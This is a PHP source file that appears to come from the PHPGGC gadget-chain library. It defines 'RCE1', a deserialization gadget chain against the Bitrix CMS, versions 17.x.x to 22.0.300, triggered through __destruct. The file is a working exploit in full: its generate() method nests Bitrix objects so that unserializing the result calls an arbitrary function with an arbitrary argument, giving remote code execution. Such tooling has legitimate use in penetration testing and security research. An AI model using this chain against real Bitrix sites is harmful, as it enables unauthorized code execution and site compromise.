<?php

namespace GadgetChain\Bitrix;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '17.x.x <= 22.0.300';
    public static $vector = '__destruct';
    public static $author = 'crlf';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Bitrix\Main\ORM\Data\Result(
			new \Bitrix\Main\Type\Dictionary(
				new \Bitrix\Main\Error(
					new \Bitrix\Main\UI\Viewer\ItemAttributes(
						new \Bitrix\Main\DB\ResultIterator(
							new \Bitrix\Main\DB\ArrayResult(
								$function, $parameter
							)
						)
					)
				)
			)
        );
    }
}
